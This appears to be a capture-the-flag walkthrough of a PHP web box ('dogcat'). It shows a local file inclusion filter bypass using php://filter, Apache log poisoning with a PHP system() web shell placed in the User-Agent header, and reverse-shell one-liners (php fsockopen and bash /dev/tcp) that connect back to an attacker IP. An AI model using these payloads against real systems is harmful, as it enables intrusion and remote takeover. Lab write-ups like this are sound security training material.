#

## Foothold
Bypass the filter with `PayLoadsAllTheThings`
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)
We get the `dog.php` and `cat.php`. Tried to get the `index.php`
Payload burp
```burp
GET /?view=php://filter/convert.base64-encode/resource=dog/../index HTTP/1.1

Host: 10.10.80.48

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.10.80.48/

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

```


```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
We noticed that the `ext` variable is default `.php`. But we can set it.
Try to get `/etc/passwd`
![etc.passwd](img/etc.passwd.png)

## LFI

i am using `seclist` with `LFI` for `Linux`.
![intruder2](img/intruder2.png)
A lot of files, we filter the errors one.
![intruder3](img/intruder3.png)

Well. we can access the apache2 log.
![apache2 log](img/apache2.log.png)

- Flag1
```burp
GET /?view=dog../../../../../../var/log/apache2/access.log&cmd=cat%20flag.php&ext= HTTP/1.1

Host: 10.10.191.127

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://10.10.191.127/

Upgrade-Insecure-Requests: 1
```



php -r '$sock=fsockopen("10.17.7.26",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

We need to url encode the payload

[https://www.functions-online.com/urlencode.html](https://www.functions-online.com/urlencode.html)

So the Burp request become like this
```Burp
GET /?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.17.7.26%22%2C1234%29%3B%24proc%3Dproc_open%28%22%2Fbin%2Fbash+-i%22%2C+array%280%3D%3E%24sock%2C+1%3D%3E%24sock%2C+2%3D%3E%24sock%29%2C%24pipes%29%3B%27 HTTP/1.1

Host: 10.10.80.48

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.10.80.48/

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```
__Note__: You need to excute at lease 2 times so the code take effect (parse).
Return to our reverse terminal, now we have shell.



"bash -i >& /dev/tcp/10.17.7.26/1235 0>&1"
